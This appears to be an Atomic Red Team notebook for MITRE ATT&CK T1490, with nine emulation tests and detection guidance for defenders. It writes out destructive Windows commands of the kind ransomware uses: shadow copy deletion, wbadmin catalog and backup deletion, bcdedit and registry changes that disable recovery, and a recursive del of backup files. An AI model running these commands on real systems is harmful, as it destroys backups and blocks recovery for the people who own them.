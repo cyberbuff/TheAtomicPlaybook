{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "49e8b23b",
   "metadata": {},
   "source": "# T1490 - Inhibit System Recovery\nAdversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017)\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>"
  },
  {
   "cell_type": "markdown",
   "id": "545774a1",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "4f997e93",
   "metadata": {},
   "source": "### Atomic Test #1 - Windows - Delete Volume Shadow Copies\nDeletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon\nexecution, if no shadow volumes exist the message \"No items found that satisfy the query.\" will be displayed. If shadow volumes are present, it\nwill delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n\nconfirmation prompt. Shadow copies can only be created on Windows server or Windows 8.\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Create volume shadow copy of C:\\ . This prereq command only works on Windows Server or Windows 8.\n\n##### Check Prereq Commands:\n```cmd\nif(!(vssadmin.exe list shadows | findstr \"No items found that satisfy the query.\")) { exit 0 } else { exit 1 }\n\n```\n##### Get Prereq Commands:\n```cmd\nvssadmin.exe create shadow /for=c:\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "65a78838",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1490 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "fb3bd7b4",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nvssadmin.exe delete shadows /all /quiet\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7ea5d54",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1490 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "d5876f55",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Windows - Delete Volume Shadow Copies via WMI",
    "Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nShadow copies can only be created on Windows server or Windows 8.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic.exe shadowcopy delete\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4b49aa71",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1490 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "7f029725",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Windows - wbadmin Delete Windows Backup Catalog",
    "Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,\n\"The backup catalog has been successfully deleted.\" will be displayed in the PowerShell session.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwbadmin delete catalog -quiet\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "78555e6d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1490 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "ec9a4f42",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Windows - Disable Windows Recovery Console Repair",
    "Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nUpon execution, \"The operation completed successfully.\" will be displayed in the powershell session.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nbcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "043dc728",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1490 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "c4729241",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nbcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1\nbcdedit.exe /set {default} recoveryenabled yes >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c2bbe143",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1490 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5d4556aa",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Windows - Delete Volume Shadow Copies via WMI with PowerShell",
    "Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.\nThis technique is used by numerous ransomware families such as Sodinokibi/REvil.\nExecutes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution\nthere may be no output displayed.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9409e4ac",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1490 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "63b9dad3",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Windows - Delete Backup Files",
    "Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many \"access is denied\" messages will appear as the commands try\nto delete files from around the system.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ndel /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e187d65d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1490 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "690e8c69",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Windows - wbadmin Delete systemstatebackup",
    "Deletes the Windows systemstatebackup using wbadmin.exe. This technique is used by numerous ransomware families. This may only be successful on server platforms that have Windows Backup enabled.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwbadmin delete systemstatebackup -keepVersions:0\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "32b153d2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1490 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "f4453dd9",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Windows - Disable the SR scheduled task",
    "Use schtasks.exe to disable the System Restore (SR) scheduled task\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nschtasks.exe /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /disable\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "12ce486e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1490 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "dc13227d",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nschtasks.exe /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /enable >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1aa394b4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1490 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f087def5",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Disable System Restore Through Registry",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable system restore on the computer. \nSee how remcos RAT abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "70c3d8f6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1490 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "67d75dba",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0335d851",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1490 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9a8e8a93",
   "metadata": {},
   "source": "## Detection\nUse process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such as vssadmin, wbadmin, and bcdedit. The Windows event logs, ex. Event ID 524 indicating a system catalog was deleted, may contain entries associated with suspicious activity.\n\nMonitor the status of services involved in system recovery. Monitor the registry for changes associated with system recovery features (ex: the creation of <code>HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\PreviousVersions\\DisableLocalPage</code>)."
  },
  {
   "cell_type": "markdown",
   "id": "25ae7e74",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### System Activity Monitoring \n Collect system activity logs which can reveal adversary activity. \n\n Capturing system logs can show logins, user and system events, etc.  Collecting this data and potentially sending it to a centralized location can help reveal the presence of an adversary and the actions they perform on a compromised system.\n#### Opportunity\nThere is an opportunity to create a detection with a moderately high probability of success.\n#### Use Case\nA defender can use process monitoring to look for command execution and command line parameters commonly used to inhibit system recovery.\n#### Procedures\nEnsure that systems capture and retain common system level activity artifacts that might be produced.\nMonitor Windows systems for event codes that reflect an adversary changing passwords, adding accounts to groups, etc.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}